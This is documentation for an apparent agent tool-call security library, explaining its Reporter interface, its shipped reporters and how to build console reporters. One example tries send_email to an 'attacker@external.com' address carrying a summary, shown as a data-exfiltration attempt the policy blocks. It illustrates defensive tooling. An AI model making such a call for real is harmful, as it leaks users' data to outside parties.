# Reporters

`Reporter` is the seam through which `check()`/`guard` emit every `Event`
(and, when [auditing](../guides/auditing.md) is on, every `Finding`).
Enforcement emits through this protocol and never imports a concrete
reporter, so swapping reporters changes nothing about how decisions are
made.

```python
class Reporter(Protocol):
    def export(self, event: Event | Finding) -> None: ...
```

## Emission is fire-and-forget

The engine guarantees a reporter failure never affects, delays, or blocks a
decision: every call to `export` is wrapped, and a failure is logged as a
warning instead of propagating. That guarantee doesn't cover blocking I/O
inside `export` itself: the shipped reporters below are non-blocking by
construction, but a custom reporter that performs blocking I/O blocks the
decision that triggered it. Keeping `export` non-blocking is the reporter
author's job.

## Shipped implementations

### `NullReporter`

The default, installed automatically when `configure()` is called with no
`reporter=`. A no-op: `export` discards the record. Keeps the library fully
functional and fully local, with zero network calls, under any default
configuration.

### `InMemoryReporter`

```python
reporter = InMemoryReporter()
runtime = configure(policy=..., reporter=reporter)
...
reporter.events       # list[Event], every emitted event in order
reporter.decisions    # list[Decision], the .decision of each Event
reporter.findings     # list[Finding], every audit finding
reporter.clear()      # discard everything captured so far
```

Captures every exported record in memory. This is the assertion surface for
tests (see [Testing](../guides/testing.md)) and for reading back audit
findings (see [Auditing](../guides/auditing.md)).

### `LoggingReporter`

Emits every record via the library logger (`interbolt`), at `DEBUG`. The
library logger stays isolated from the root logger and emits nothing at
import; attach a handler to `"interbolt"` (or call
`interbolt.utils.get_logger()`) to see output.

### `JsonlReporter`

```python
reporter = JsonlReporter("provenance.jsonl")
runtime = configure(policy=..., reporter=reporter)
```

Appends every exported record as one JSON line to a file: append mode,
flushed and `fsync`ed before `export` returns, so a record is durable on
disk immediately. Each line carries a `record_type` key (`"event"` or
`"finding"`) alongside the record's own fields. This is the format
`interbolt inspect <path>` reads, rendering the log as a console tree
grouped by run and agent.

### `CompositeReporter`

```python
reporter = CompositeReporter([JsonlReporter("provenance.jsonl"), InMemoryReporter()])
runtime = configure(policy=..., reporter=reporter)
```

Fans a record out to a fixed sequence of reporters, calling `export` on
each in order. One sub-reporter's failure is caught and logged the same
way the engine isolates a single reporter's failure, so it never prevents
the record from reaching the others. Use this to combine a durable sink
(`JsonlReporter`) with a live one (a console reporter, below) or a test
assertion surface (`InMemoryReporter`), instead of hand-writing the fan-out.

## `describe_event` / `describe_finding` / `describe_decision`

```python
from interbolt import describe_decision, describe_event, describe_finding
```

Turn an `Event`/`Finding`/`Decision` into a one-line, rich-markup-tagged
human summary (`describe_event` includes the tool, action, matched rule,
mode, and `untrusted_sources`, the direct answer to "why was this blocked",
alongside the full contributing `sources` and `lineage`). This is the
building block `interbolt inspect` uses internally, and the recommended
starting point for a custom console reporter (next section) rather than
reinventing the action-to-color mapping per integrator.

`describe_decision` covers the same ground as `describe_event`, but for a
bare `Decision` rather than the emitted `Event` that wraps it, plus the
matched rule's CEL condition text when there is one (`event.decision.matched_condition`
is reachable on an `Event` too, one hop in; `describe_event`'s formatted
string just doesn't surface it, to keep that line focused on identity and
sources). Reach for `describe_decision` at the point a `Decision` is
already in hand and going through the reporter stream would be
unnecessary: a caught `PolicyViolation`/`ApprovalDenied` (`e.decision`), or
`check()`'s direct return value.

```python
from rich.console import Console
from interbolt import PolicyViolation, describe_decision

try:
    send_email(to="attacker@external.com", body=summary)
except PolicyViolation as e:
    Console().print(describe_decision(e.decision))
```

## Writing a custom reporter

Any object with a matching `export(self, event: Event | Finding) -> None`
method satisfies the protocol structurally; no base class or registration
is required. For a reporter that does real I/O
(writing to a file, shipping to a collector), own your own non-blocking
behavior: buffer locally and drain on a background thread or task rather
than performing I/O inline inside `export`.

```python
class FileReporter:
    def __init__(self, path: str) -> None:
        self._path = path

    def export(self, event: Event | Finding) -> None:
        with open(self._path, "a", encoding="utf-8") as f:
            f.write(event.model_dump_json() + "\n")
```

(This minimal example performs blocking I/O for clarity; a production
reporter should buffer and drain off the decision path.)

## Building a console reporter

`Reporter` is also the right seam for a CLI or app that wants to show a
human decision output as it happens: blocked, approval required, allowed.
Write a small reporter using `describe_event`/`describe_finding` and attach
it at `configure()` time:

```python
from interbolt import Action, Event, Finding, configure, describe_event, describe_finding

class CLIReporter:
    def __init__(self, console, verbose=False):
        self.console = console
        self.verbose = verbose

    def export(self, record):
        if isinstance(record, Event):
            if record.decision.action is Action.ALLOW and not self.verbose:
                return
            self.console.print(describe_event(record))
        else:
            self.console.print(describe_finding(record))

runtime = configure(policy=..., reporter=CLIReporter(console, verbose=args.verbose))
```

`ALLOW` is gated behind `verbose` deliberately: an agent can make dozens of
tool calls in a session, and if every allow prints a line, the block you
actually care about scrolls off screen or gets lost. Quiet by default with
a `-v` flag for full visibility is the same convention git and docker use,
and it keeps the signal-to-noise ratio high for the case that matters most:
something got blocked and the operator needs to know why.

This goes through `Reporter`, not `logging.getLogger("interbolt")`. The
library logger channel is for interbolt's own internal diagnostics
(propagation, merges, policy matching); mixing decision output into it
means filtering the library's `DEBUG` noise back out to get just the
decisions you want. `Reporter` already gives clean, structured access to
exactly the records you care about.

Want more than console output at the same time, a durable audit trail
alongside the live view? Wrap both in a `CompositeReporter`:

```python
runtime = configure(
    policy=...,
    reporter=CompositeReporter([
        JsonlReporter("provenance.jsonl"),
        CLIReporter(console, verbose=args.verbose),
    ]),
)
```

For confirming setup at startup (not an ongoing signal), print once from
whatever `configure()` returns rather than adding a periodic "still active"
message; a security library should be silent when nothing is happening and
loud when something is blocked.
